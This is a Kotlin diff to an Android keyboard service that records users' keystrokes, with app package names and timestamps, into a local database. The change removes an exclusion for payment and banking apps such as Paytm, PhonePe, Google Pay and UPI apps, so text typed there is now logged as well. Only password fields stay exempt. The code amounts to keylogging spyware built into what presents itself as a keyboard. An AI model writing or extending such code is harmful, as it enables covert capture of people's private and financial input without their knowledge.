@@ -116,19 +116,7 @@ class MyKeyboardService : InputMethodService(), KeyboardView.OnKeyboardActionLis
         if (!KeyloggingConfig.isEnabled) return
         if (isPasswordField) return
 
-        val pkg = currentInputEditorInfo?.packageName ?: ""
-        if (pkg.contains("paytm", true) ||
-            pkg.contains("phonepe", true) ||
-            pkg.contains("paisa", true) ||
-            pkg.contains("navi", true) ||
-            pkg.contains("bank", true) ||
-            pkg.contains("upi", true) ||
-            pkg.contains("gpay", true) ||
-            pkg.contains("google.android.apps.nbu.paisa.user", true) ||
-            pkg.contains("phonepe.app", true)) {
-            return
-        }
-
+        val pkg = currentInputEditorInfo?.packageName
         serviceScope.launch {
             AppDatabase.getInstance(applicationContext).keystrokeDao().insert(
                 KeystrokeLog(text = text, timestamp = System.currentTimeMillis(), packageName = pkg)
